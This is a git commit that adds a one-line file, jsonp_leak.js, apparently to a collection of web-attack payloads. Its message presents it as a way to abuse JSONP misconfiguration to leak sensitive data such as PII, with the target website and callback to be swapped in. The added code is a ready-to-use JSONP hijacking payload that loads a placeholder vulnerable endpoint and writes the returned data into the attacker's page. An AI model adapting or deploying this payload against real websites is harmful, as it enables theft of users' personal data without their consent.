6f883160ad29a6d0a34bf71ff96b1b6cfa7d412b
kuorof <kuorof@gmail.com>
2025-06-19 16:48:03 +0100

    Create jsonp_leak.js
    misconfiguration to leak sensitive data like PII
    change the target website and the function accordingly

---
+++ information_leakage/jsonp_leak.js
@@ -0,0 +1,1 @@
+<script> function targetfunction(data) { document.write(JSON.stringify(data)) } </script> <script src="https://vulnerable-website.com/jsonp/info.php?callback=targetfunction"> </script>
